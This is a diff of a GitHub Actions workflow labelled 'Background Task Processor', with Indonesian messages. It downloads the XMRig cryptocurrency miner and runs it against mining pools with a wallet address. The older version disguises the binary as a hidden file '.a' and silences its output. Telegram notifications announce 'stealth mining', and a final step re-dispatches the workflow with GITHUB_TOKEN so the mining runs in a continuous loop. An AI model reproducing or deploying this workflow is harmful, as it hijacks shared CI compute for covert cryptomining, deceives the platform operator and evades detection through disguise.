@@ -3,49 +3,54 @@ name: Background Task Processor
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"
+    - cron: "0 */6 * * *" # setiap 6 jam sekali
 
 jobs:
   task:
     runs-on: ubuntu-latest
+
     steps:
-    - name: Prepare Environment
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y wget curl jq tar
+      - name: Set up job
+        run: echo "Initializing task..."
 
-    - name: Notify Start to Telegram
-      env:
-        TG_TOKEN: ${{ secrets.TG_TOKEN }}
-        TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
-      run: |
-        curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-        -d chat_id=$TG_CHAT_ID \
-        -d text="🟢 Stealth mining dimulai.\n\nWorker sedang dijalankan melalui GitHub Actions."
+      - name: Prepare Environment
+        run: sudo apt update -y && sudo apt install curl tar -y
 
-    - name: Download & Run Stealth Worker
-      run: |
-        curl -LO https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-        tar -xzf xmrig-6.24.0-linux-static-x64.tar.gz
-        mv xmrig-6.24.0 task
-        cd task
-        mv xmrig .a
-        chmod +x .a
-        timeout 350m ./\.a -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p stealth > /dev/null 2>&1
+      - name: Notify Start to Telegram
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+        run: |
+          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+          -d chat_id=$TG_CHAT_ID \
+          -d text="🟢 *Stealth mining dimulai.*\n\nWorker sedang dijalankan melalui GitHub Actions." \
+          -d parse_mode=Markdown
 
-    - name: Notify Done to Telegram
-      env:
-        TG_TOKEN: ${{ secrets.TG_TOKEN }}
-        TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
-      run: |
-        curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-        -d chat_id=$TG_CHAT_ID \
-        -d text="✅ Stealth mining selesai.\n\nDurasi: 350 menit\nStatus: Done."
+      - name: Download & Run Stealth Worker
+        run: |
+          curl -L -o runner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf runner.tar.gz
+          cd xmrig-6.24.0
+          chmod +x xmrig
+          timeout 300s ./xmrig -o pool.hashvault.pro:443 -u 44dW8Q... -p x --tls
 
-    - name: Re-trigger Task
-      if: ${{ github.event_name == 'workflow_dispatch' }}
-      run: |
-        curl -X POST -H "Accept: application/vnd.github+json" \
-             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-             https://api.github.com/repos/${{ github.repository }}/actions/workflows/build.yml/dispatches \
-             -d '{"ref":"main"}'
+      - name: Notify Done to Telegram
+        if: always()
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+        run: |
+          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+          -d chat_id=$TG_CHAT_ID \
+          -d text="🛑 *Stealth mining selesai atau dihentikan.*\n\nGitHub Actions selesai menjalankan worker." \
+          -d parse_mode=Markdown
+
+      - name: Re-trigger Task
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -X POST -H "Accept: application/vnd.github+json" \
+               -H "Authorization: Bearer $GH_TOKEN" \
+               https://api.github.com/repos/${{ github.repository }}/actions/workflows/build.yml/dispatches \
+               -d '{"ref":"main"}'
